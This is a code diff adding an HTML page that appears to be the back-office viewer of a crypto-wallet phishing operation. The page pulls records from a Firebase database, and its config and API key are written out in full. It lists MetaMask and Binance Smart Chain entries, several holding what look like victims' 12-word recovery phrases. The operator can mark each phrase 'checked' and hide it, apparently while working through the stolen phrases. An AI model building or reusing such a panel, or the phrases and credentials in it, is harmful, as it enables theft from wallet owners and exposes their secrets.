@@ -1,0 +1,141 @@
+<html lang="en"><script type="text/javascript">window["_gaUserPrefs"] = { ioo : function() { return true; } }</script><script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/inpage.js"></script><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+    <button id="checked" class="button is-danger">hide checked?</button>
+    <div class="content">
+
+        <div class="information">
+    
+    <div class="data">
+    <span class="tag time is-info">undefined</span>
+    <span class="tag wallet is-success">MetaMask</span><br>
+    <span class="tag key">1.,because
+2.,depend
+,7.,luggage
+8.,shove
+3.,clump
+9.,sail
+4.,scheme
+10.,fruit
+5.,good
+6.,panel
+11.,virus
+12.,clown</span>
+    </div>
+    
+    <div class="data">
+    <span class="tag time is-info">undefined</span>
+    <span class="tag wallet is-success">MetaMask</span><br>
+    <span class="tag key">mimic,student,thunder,stable,identify,weather,primary,cage,breeze,diary,sadness,office</span>
+    </div>
+    
+    <div class="data">
+    <span class="tag time is-info">undefined</span>
+    <span class="tag wallet is-success">Binance Smart Chain</span><br>
+    <span class="tag key">zsrgzdsr,zsrgez,srgz,sdrgzd,srgzdrg,zdrg,zdrg,zdrgzd,rgzdrg,zdrgzgrds,gzdrg,zdrg,zdrg</span>
+    </div>
+    
+    <div class="data">
+    <span class="tag time is-info">undefined</span>
+    <span class="tag wallet is-success">MetaMask</span><br>
+    <span class="tag key">because
+2.,depend
+(,7.,luggage
+8.,shove
+3.,clump
+9.,sail
+4.,scheme
+10.,fruit
+5.,good
+6.,panel
+11.,virus
+12.,clown</span>
+    </div>
+    
+    <div class="data">
+    <span class="tag time is-info">undefined</span>
+    <span class="tag wallet is-success">MetaMask</span><br>
+    <span class="tag key">test,test,test,test,test,test,test,test,test,test,test,</span>
+    </div>
+    </div>
+
+</div>
+    
+<script type="module">
+    import firebase from "https://cdn.skypack.dev/firebase/compat/app";
+    import "https://cdn.skypack.dev/firebase/compat/firestore";
+    
+    const config = {
+     apiKey: "AIzaSyCPHRgTbpTzocHnBJ6YDDtS6pzweIjYxII",
+      authDomain: "manaboss.firebaseapp.com",
+      projectId: "manaboss",
+      storageBucket: "manaboss.appspot.com",
+      messagingSenderId: "1050200231775",
+      appId: "1:1050200231775:web:a8aa47a0b96c29347930ea",
+      measurementId: "G-JPSW086DN4"
+    }
+    
+    const app = firebase.initializeApp(config)
+    const db = firebase.firestore(app)
+    
+    const ref = db.collection('databases').doc('syncsdapp')
+    //test
+    
+    setTimeout(() => {
+        $('.data').each(function() {
+        $(this).find('.key').on('click', ()=>{
+    
+            const info = $('.information').html()
+    
+            $(this).append(`
+            <span class="tag is-warning">checked</span>
+            `)
+    
+            setTimeout(() => {
+                result()
+            }, 2000);
+            // console.log(info)
+        })
+    
+        
+    })
+    }, 3000);
+    
+    function result() {
+        const info = $('.information').html()
+        console.log(info)
+            ref.set({
+                text: info
+            }).then( () => {
+                console.log('success');
+            })
+    }
+    
+    $(document).ready(function() {
+        $('.information').html('')
+    
+        ref.get().then( (doc) => {
+        const text = doc.data().text
+        $('.information').html(text)
+        // console.log(text)
+    })
+    })
+    </script>
+
+<script>
+    $('#checked').on('click', () => {
+        $('.data').each(function() {
+            const warning = $(this).find('.is-warning').html()
+            const parent = $(this).find('.is-warning').parent('.data').hide()
+        })
+    })
+</script>
+
+</body></html>
